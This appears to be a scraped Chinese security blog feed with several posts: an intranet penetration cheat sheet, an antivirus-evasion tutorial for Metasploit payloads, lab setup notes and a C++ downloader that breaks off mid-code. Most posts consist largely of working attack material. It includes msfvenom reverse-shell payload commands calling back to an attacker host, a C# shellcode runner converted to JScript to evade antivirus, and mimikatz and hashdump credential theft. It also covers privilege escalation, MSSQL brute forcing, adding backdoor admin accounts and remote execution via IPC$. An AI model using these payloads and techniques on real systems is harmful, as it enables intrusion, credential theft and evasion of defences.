&lt;Drive&gt;:\&lt;Folder&gt;</code></pre><p> <code>&lt;Drive&gt;:\&lt;Folder&gt;</code> 是要创建的文件的文件夹路径。</p><p>例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p><pre><code>ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</code></pre><h2 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h2><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p><p>支持的操作系统</p><table><thead><tr><th>os</th><th>service</th><th>supported</th></tr></thead><tbody><tr><td>Ubuntu Desktop 12.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Ubuntu Desktop 16.04 LTS x64</td><td>gnome-keyring-daemon (3.18.3)</td><td>Y</td></tr><tr><td>Fedora Workstation 25 (x86_64)</td><td>gnome-keyring-daemon (3.20.0)</td><td>Y</td></tr><tr><td>Fedora Workstation 27 (x86_64)</td><td>gnome-keyring-daemon (3.20.1)</td><td>Y</td></tr><tr><td>Kali-rolling x64</td><td>gnome-keyring-daemon (3.28.0.2)</td><td>Y</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源工具DotNetToJScript详细编译教程</title>
      <link href="/2021/06/08/kai-yuan-gong-ju-dotnettojscript.htm"/>
      <url>/2021/06/08/kai-yuan-gong-ju-dotnettojscript.htm</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。</p><p>工具下载：<a href="https://github.com/tyranid/DotNetToJScript">下载地址</a></p><span id="more"></span><h2 id="0x01-用到工具"><a href="#0x01-用到工具" class="headerlink" title="0x01 用到工具"></a>0x01 用到工具</h2><p>由于此为开源代码需要自己编译，通过自己的研究终于编译成功。</p><ul><li>使用工具vs2017； </li><li>ndesk-options-0.2.1.bin 文件的引用。</li></ul><h2 id="0x02-编译过程"><a href="#0x02-编译过程" class="headerlink" title="0x02 编译过程"></a>0x02 编译过程</h2><ul><li><p>打开vs2017，点击打开项目/解决方案；<img src="/uploads/3.png" alt="3"></p></li><li><p>打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C#  项目文件；<img src="/uploads/4.png" alt="4"></p></li><li><p>点击Program.cs生成解决方案；</p><p><img src="/uploads/5.png" alt="5"></p></li><li><p>报错缺少程序集引用 NDesk.Options；<img src="/uploads/2.png" alt="2"></p></li><li><p>解决办法</p><p>需要添加引用 NDesk.Options</p><p>下载地址：</p><p><a href="http://www.ndesk.org/archive/ndesk-options/ndesk-options-0.2.1.bin.zip">点击下载</a>           解压缩，按图添加引用；</p><p><img src="/uploads/1.png" alt="1"></p><p>​</p></li><li><p>浏览—-选择图中文件—-添加；</p><p><img src="/uploads/7.png" alt="7"></p></li><li><p>然后重新生成解决方案即可；<img src="/uploads/8.png" alt="8"></p><p>​</p><p>​</p><p>​</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建域环境</title>
      <link href="/2021/06/08/yu-huan-jing-da-jian.htm"/>
      <url>/2021/06/08/yu-huan-jing-da-jian.htm</url>
      
        <content type="html"><![CDATA[<p><strong>域环境搭建 准备： DC: Windows 2008 server R2 DM: Windows 2003 server SP2</strong></p><p><strong>Windows 2008 server R2 (域控)</strong></p><span id="more"></span><p>1、修改计算机名： 可以改成DC或者其他什么看着顺眼的名字，默认也行，就是搭建好域以后再改可能会遇到一些问题；</p><p><img src="/uploads/y1.png" alt="imgl"></p><p><img src="/uploads/y2.png" alt="imgl"></p><p>2、配置固定ip: 我虚拟机使用的桥接方式，并且路由器是192.168.3.1，所以在这如此设置，此处的DNS填写本机即，127.0.0.1；</p><p><img src="/uploads/y3.png" alt="imgl"></p><p>3、服务器管理器—角色：安装Active Directory 域服务并且会同时要求安装DNS服务器；</p><p><img src="/uploads/y4.png" alt="imgl"></p><p>4、配置域服务:打开服务器管理器或者在运行框下输入 dcpromo直接进行配置，选择新建，</p><p>Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码；</p><p><img src="/uploads/y5.png" alt="imgl"></p><p>5、设置林根域： 林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生 具体见：<a href="http://angerfire.blog.51cto.com/198455/144123/">http://angerfire.blog.51cto.com/198455/144123/ </a></p><p>6、域数据存放的地址：默认即可。</p><p><strong>DM: Windows 2003 server SP2</strong></p><p>1、如果新安装的虚拟机安装时会有选择项是加入域还是组，我这里选择加入域，会让登录当前域的账号密码即“Domaim\administrator”（必须是域账号不是administrator）和对应密码；已有的Windows2003加入域，首先更改组为域选择正确的domain和domain账号密码即可。</p><p>2、安装成功后配置静态IP，DNS处填写DC的IP；</p><p><img src="/uploads/y6.png" alt="imgl"></p><p>3、在2003上执行net time显示如图，说明已经加入域，并且在Windows2008上的domain.com域，控制器上可以看到03的机器；</p><p><img src="/uploads/y7.png" alt="imgl"></p><p><img src="/uploads/y8.png" alt="imgl"></p><p><strong>域已经搭建完成，主域控会生成一个 krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。</strong><br><img src="/uploads/y9.png" alt="imgl"></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透小记</title>
      <link href="/2021/06/08/nei-wang-shen-tou-xiao-ji.htm"/>
      <url>/2021/06/08/nei-wang-shen-tou-xiao-ji.htm</url>
      
        <content type="html"><![CDATA[<h2 id="常用一句话webshell"><a href="#常用一句话webshell" class="headerlink" title="常用一句话webshell"></a>常用一句话webshell</h2><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><span id="more"></span><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt;  查看dns列表（DC执行）tasklist /SVC   查看系统进程及其描述query user || qwinsta 查看当前在线用户net user  查看本机用户net user /domain 查看域用户net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc   查看 dc 域内共享文件net group /domain 查看域里面的组net group &quot;domain admins&quot; /domain 查看域管net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管net group &quot;domain controllers&quot; /domain 域控net time /domain net config workstation   当前登录域 - 计算机名 - 用户名net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfigsysteminfotasklist /svc   详细进程信息tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklisttaskkill /im  imagename  /f  结束进程net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx  查看域控nltest /domain_trusts   查看域信任信息whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share     共享目录cmdkey /l   查看保存登陆凭证echo %logonserver%  查看登陆域spn –l administrator spn 记录set  环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -atracert  查路由</code></pre><h2 id="windows-下载文件"><a href="#windows-下载文件" class="headerlink" title="windows 下载文件"></a>windows 下载文件</h2><ul><li><p>bitsadmin</p><pre class="line-numbers language-powershell"><code class="language-powershell">download文件bitsadmin <span class="token operator">/</span>transfer n https:<span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>robots<span class="token punctuation">.</span>txt c:\1<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>powershell</p><pre class="line-numbers language-powershell"><code class="language-powershell">一条命令download文件powershell <span class="token punctuation">(</span><span class="token function">new-object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/robots.txt'</span><span class="token punctuation">,</span><span class="token string">'C:\1.txt'</span><span class="token punctuation">)</span>多条命令download文件<span class="token variable">$client</span> = <span class="token function">new-object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token variable">$client</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/robots.txt'</span><span class="token punctuation">,</span> <span class="token string">'C:\1.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>certutil.exe</p><pre><code>cmd.exe /c certutil.exe -urlcache -split -f https://www.baidu.com/robots.txt</code></pre></li></ul><h2 id="添加删除用户操作"><a href="#添加删除用户操作" class="headerlink" title="添加删除用户操作"></a>添加删除用户操作</h2><ul><li><pre><code>net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add    添加用户并设置管理员net user admin1 /del</code></pre></li></ul><h2 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h2><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p>tools:<br><a href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a><br>正向：<br>被攻击机(跳板)：</p><blockquote><p>./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)<br>netstat -pantu|grep 9999 (查看是否侦听成功)</p></blockquote><p>攻击机：</p><blockquote><p>proxychain 设置 socks5 为跳板 ip port<br>proxychain nmap 即可以用跳板代理扫描其他主机</p></blockquote><h4 id="netsh-Windows-自带工具-windows-端口转发"><a href="#netsh-Windows-自带工具-windows-端口转发" class="headerlink" title="netsh   Windows 自带工具   windows 端口转发"></a>netsh   Windows 自带工具   windows 端口转发</h4><pre><code>netsh interface portproxy add v4tov4  listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4  connectport=8880netsh interface  portproxy show  v4tov4netsh interface portproxy delete v4tov4  listenaddress=0.0.0.0 listenport=53  </code></pre><p>MSF反弹 shell  </p><blockquote><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe </p></blockquote><p>1.生成一个回连木马</p><blockquote><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll</p></blockquote><p>2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连</p><blockquote><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.2.111<br>set lport 443<br>run</p></blockquote><p>4.提权</p><blockquote><p>background 或 ctrl+z </p><p>use exploit/windows/local/ms11_080_afdjoinleaf<br>set session 1<br>run<br>hashdump      //密码获取<br>load mimikatz //使用mimikatz<br>kerberos      //查看解密</p></blockquote><p>5.新加路由查看子网</p><blockquote><p>route<br>background<br>sessions<br>route add 192.168.2.0 255.255.255.0 2<br>search mssql   //找mssql模块<br>use auxiliary/scanner/mssql/mssql_login  //使用login模块</p></blockquote><blockquote><p>show options </p></blockquote><blockquote><p>set rhosts 192.168.177.1/24 </p></blockquote><blockquote><p>set password sa@123<br>run<br>show options<br>set BEUTEFORCE_SPEED 0<br>run</p></blockquote><p>端口扫描search portscan </p><blockquote><p>use   auxiliary/scanner/portscan/tcp  //使用scanner模块<br>show options<br>set RHOSTS 192.168.2.0/24<br>set ports 139,445,3389  //设置扫描端口</p></blockquote><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><blockquote><p>D:&gt;net use \192.168.1.254\c$ “pwd” /user:user     //连接192.168.1.254的IPC$共享，用unc路径<br>D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录<br>D:&gt;net time \192.168.1.254         //查时间<br>D:&gt;at　\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exe<br>D:&gt;net use \192.168.1.254\c$ /del</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀 MSF Windows Payload 的方法与实践（小白视角）</title>
      <link href="/2021/06/08/mian-sha-msf-windows-payload-de-fang-fa-yu-shi-jian.htm"/>
      <url>/2021/06/08/mian-sha-msf-windows-payload-de-fang-fa-yu-shi-jian.htm</url>
      
        <content type="html"><![CDATA[<blockquote><p>MSF 是当下最流行的渗透测试平台，在进行后渗透阶段往往需要我们绕过杀软等隐蔽操作，在看完余弦猥琐流打发之后，自个手动实践，然后写一个详细的演练操作，做笔记存档。</p></blockquote><span id="more"></span><h2 id="0x00-制作payload"><a href="#0x00-制作payload" class="headerlink" title="0x00 制作payload"></a>0x00 制作payload</h2><p>使用 kali 里的 msfvenom 生成一个x86的 Meterpreter Payload 命令如下：</p><pre class="line-numbers language-c++"><code class="language-c++">root@kali:~# msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.99 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p><p>生成结果 <code>cat https.csharp</code> 如图所示，</p><p><img src="/uploads/11.png" alt="payload"></p><h2 id="0x01-创建-c-项目"><a href="#0x01-创建-c-项目" class="headerlink" title="0x01 创建 c# 项目"></a>0x01 创建 c# 项目</h2><p>我们需要创建一个 C# 项目，我使用的是 Visual Studio 2017。新建一个空白的 C# 的控制台应用(.NET Framework)工程，.Net Framework 版本选择 2.0（保证兼容性）。</p><p>将下列代码粘贴覆盖到 Program.cs 中：</p><pre class="line-numbers language-c#"><code class="language-c#">using System;using System.Threading;using System.Runtime.InteropServices;namespace MSFWrapper&#123;    public class Program    &#123;        public Program()        &#123;           RunMSF();        &#125;        public static void RunMSF()        &#123;            byte[] MsfPayload = &#123;            //Paste your Payload here        &#125;;            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);            Thread.Sleep(2000);        &#125;        public static void Main()        &#123;        &#125;        [DllImport("kernel32.dll")]        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);        [DllImport("kernel32.dll")]        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将在 kali 生成的 payload 中的十六进制数数组粘贴到代码中注释为“//Paste your Payload here”的下面。</p><p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存，如图：</p><p><img src="/uploads/22.png" alt="vs2017"></p><p>增加 Release 版的 x86 编译对象，如图：</p><p><img src="/uploads/33.png" alt="release"></p><p>然后生成出 MSFWrapper.exe ：</p><p><img src="/uploads/44.png" alt="生成exe"></p><h2 id="0x02-将生成的-exe-文件转换成-js-文件"><a href="#0x02-将生成的-exe-文件转换成-js-文件" class="headerlink" title="0x02 将生成的 exe 文件转换成 js 文件"></a>0x02 将生成的 exe 文件转换成 js 文件</h2><p><a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript源码下载 </a></p><p><a href="http://s.yl0.org/2017/12/17/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html">开源工具DotNetToJScript详细编译教程</a></p><p>转换命令：</p><p><code>F:\WEB渗透工具&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe</code></p><h2 id="0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell"><a href="#0x03-通过命令执行-js-文件使其弹回-Meterpreter-shell" class="headerlink" title="0x03 通过命令执行 js 文件使其弹回 Meterpreter shell"></a>0x03 通过命令执行 js 文件使其弹回 Meterpreter shell</h2><p>在 kali 里执行命令进行监听：</p><pre class="line-numbers language-c"><code class="language-c">root@kali<span class="token punctuation">:</span><span class="token operator">~</span># msfconsole msf <span class="token operator">></span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_httpsmsf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> set lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.99</span>msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> set lport <span class="token number">443</span>msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在目标机器执行如下命令：</p><p><code>C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js</code></p><p>kali 反弹回 meterpreter ：</p><pre><code>[*] Started HTTPS reverse handler on https://192.168.1.99:443[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ...</code></pre><p>这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！</p><h2 id="0x04-END"><a href="#0x04-END" class="headerlink" title="0x04 END"></a>0x04 END</h2><p>未完待续 ing……</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> payloads </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wininet_downloader_cpp</title>
      <link href="/2021/06/08/wininet-downloader-cpp.htm"/>
      <url>/2021/06/08/wininet-downloader-cpp.htm</url>
      
        <content type="html"><![CDATA[<blockquote><p>wininet.lib  cpp 下载</p></blockquote><span id="more"></span><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;wininet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span> <span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib, "wininet.lib")</span> <span class="token macro property">#<span class="token directive keyword">define</span>  DOWNHELPER_AGENTNAME         "downloader"</span><span class="token macro property">#<span class="token directive keyword">define</span>  LEN_OF_BUFFER_FOR_QUERYINFO  128</span><span class="token macro property">#<span class="token directive keyword">define</span>  DOWNLOAD_BUF_SIZE            (10*1024)  </span><span class="token macro property">#<span class="token directive keyword">define</span>  MAX_DOWNLOAD_REQUEST_TIME    10  </span><span class="token macro property">#<span class="token directive keyword">define</span>  MAX_DOWNLOAD_BYTESIZE        (10000*1024*1024)</span>  BOOL <span class="token function">_TryHttpSendRequest</span><span class="token punctuation">(</span>LPVOID hRequest<span class="token punctuation">,</span> <span class="token keyword">int</span> nMaxTryTimes<span class="token punctuation">)</span><span class="token punctuation">;</span>  BOOL <span class="token function">DownloadUrl</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string strUrl<span class="token punctuation">,</span> std<span class="token operator">::</span>string strFileName<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    BOOL bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>strUrl <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> strFileName <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>        HINTERNET hInet <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     HINTERNET hConnect <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     HINTERNET hRequestHead <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     HINTERNET hRequestGet <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     HANDLE hFileWrite <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token keyword">char</span><span class="token operator">*</span> pBuf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     DWORD dwRequestTryTimes <span class="token operator">=</span> MAX_DOWNLOAD_REQUEST_TIME<span class="token punctuation">;</span>    DWORD dwDownBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     DWORD dwDownFileTotalBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     DWORD dwWriteBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> bufQueryInfo<span class="token punctuation">[</span>LEN_OF_BUFFER_FOR_QUERYINFO<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>     DWORD dwBufQueryInfoSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>bufQueryInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD dwStatusCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwContentLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwSizeDW <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>         CHAR pszHostName<span class="token punctuation">[</span>INTERNET_MAX_HOST_NAME_LENGTH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    CHAR pszUserName<span class="token punctuation">[</span>INTERNET_MAX_USER_NAME_LENGTH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    CHAR pszPassword<span class="token punctuation">[</span>INTERNET_MAX_PASSWORD_LENGTH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    CHAR pszURLPath<span class="token punctuation">[</span>INTERNET_MAX_URL_LENGTH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    CHAR szURL<span class="token punctuation">[</span>INTERNET_MAX_URL_LENGTH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    URL_COMPONENTSA urlComponents <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>dwStructSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>URL_COMPONENTSA<span class="token punctuation">)</span><span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>lpszHostName <span class="token operator">=</span> pszHostName<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>dwHostNameLength <span class="token operator">=</span> INTERNET_MAX_HOST_NAME_LENGTH<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>lpszUserName <span class="token operator">=</span> pszUserName<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>dwUserNameLength <span class="token operator">=</span> INTERNET_MAX_USER_NAME_LENGTH<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>lpszPassword <span class="token operator">=</span> pszPassword<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>dwPasswordLength <span class="token operator">=</span> INTERNET_MAX_PASSWORD_LENGTH<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>lpszUrlPath <span class="token operator">=</span> pszURLPath<span class="token punctuation">;</span>    urlComponents<span class="token punctuation">.</span>dwUrlPathLength <span class="token operator">=</span> INTERNET_MAX_URL_LENGTH<span class="token punctuation">;</span>     bRet <span class="token operator">=</span> <span class="token function">InternetCrackUrlA</span><span class="token punctuation">(</span>strUrl<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>urlComponents<span class="token punctuation">)</span><span class="token punctuation">;</span>    bRet <span class="token operator">=</span> <span class="token punctuation">(</span>bRet <span class="token operator">&amp;&amp;</span> urlComponents<span class="token punctuation">.</span>nScheme <span class="token operator">==</span> INTERNET_SERVICE_HTTP<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bRet<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            hInet <span class="token operator">=</span> <span class="token function">InternetOpenA</span><span class="token punctuation">(</span>DOWNHELPER_AGENTNAME<span class="token punctuation">,</span> INTERNET_OPEN_TYPE_PRECONFIG<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hInet<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            hConnect <span class="token operator">=</span> <span class="token function">InternetConnectA</span><span class="token punctuation">(</span>hInet<span class="token punctuation">,</span> pszHostName<span class="token punctuation">,</span> urlComponents<span class="token punctuation">.</span>nPort<span class="token punctuation">,</span> pszUserName<span class="token punctuation">,</span> pszPassword<span class="token punctuation">,</span> INTERNET_SERVICE_HTTP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hConnect<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>    <span class="token 